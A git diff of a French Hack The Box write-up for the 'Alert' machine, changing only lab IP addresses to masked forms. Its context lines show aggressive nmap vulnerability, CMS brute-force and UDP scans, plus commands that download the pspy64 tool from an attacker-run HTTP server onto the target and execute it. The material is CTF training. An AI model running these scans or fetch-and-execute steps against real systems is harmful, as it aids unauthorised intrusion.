@@ -154,7 +154,7 @@ Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) permet d’identifier les p
 
 ```bash
 # Nmap 7.98 scan initiated Sat Mar 21 09:53:00 2026 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt alert.htb
-Nmap scan report for alert.htb (10.129.231.188)
+Nmap scan report for alert.htb (10.129.x.x)
 Host is up (0.015s latency).
 Not shown: 65532 closed tcp ports (reset)
 PORT      STATE    SERVICE
@@ -200,7 +200,7 @@ Résultat (`scans_nmap/aggressive_vuln_scan.txt`) :
     nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "alert.htb"
 
 # Nmap 7.98 scan initiated Sat Mar 21 09:53:07 2026 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt alert.htb
-Nmap scan report for alert.htb (10.129.231.188)
+Nmap scan report for alert.htb (10.129.x.x)
 Host is up (0.016s latency).
 
 PORT   STATE SERVICE VERSION
@@ -217,8 +217,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE (using port 22/tcp)
 HOP RTT      ADDRESS
-1   58.01 ms 10.10.16.1
-2   7.99 ms  alert.htb (10.129.231.188)
+1   58.01 ms 10.10.x.x
+2   7.99 ms  alert.htb (10.129.x.x)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sat Mar 21 09:53:22 2026 -- 1 IP address (1 host up) scanned in 14.36 seconds
@@ -232,7 +232,7 @@ Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).
 
 ```bash
 # Nmap 7.98 scan initiated Sat Mar 21 09:53:22 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt alert.htb
-Nmap scan report for alert.htb (10.129.231.188)
+Nmap scan report for alert.htb (10.129.x.x)
 Host is up (0.014s latency).
 
 PORT   STATE SERVICE VERSION
@@ -276,7 +276,7 @@ Un scan UDP rapide est également lancé afin d’identifier d’éventuels serv
 
 ```bash
 # Nmap 7.98 scan initiated Sat Mar 21 09:53:37 2026 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt alert.htb
-Nmap scan report for alert.htb (10.129.231.188)
+Nmap scan report for alert.htb (10.129.x.x)
 Host is up (0.017s latency).
 
 PORT      STATE         SERVICE
@@ -444,7 +444,7 @@ Script       : mon-subdomains
 Version      : mon-subdomains 2.0.0
 Date         : 2026-03-21 09:58:24
 Domaine      : alert.htb
-IP           : 10.129.231.188
+IP           : 10.129.x.x
 Mode         : large
 Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
 Codes        : 200,301,302,401,403  (strict=1)
@@ -1140,7 +1140,7 @@ Tu le télécharges et l’exécutes depuis le répertoire persistant (`/var/tmp
 
 ```bash
 cd /var/tmp
-wget http://10.10.16.93:8000/pspy64
+wget http://10.10.x.x:8000/pspy64
 chmod +x pspy64
 ./pspy64
 ```
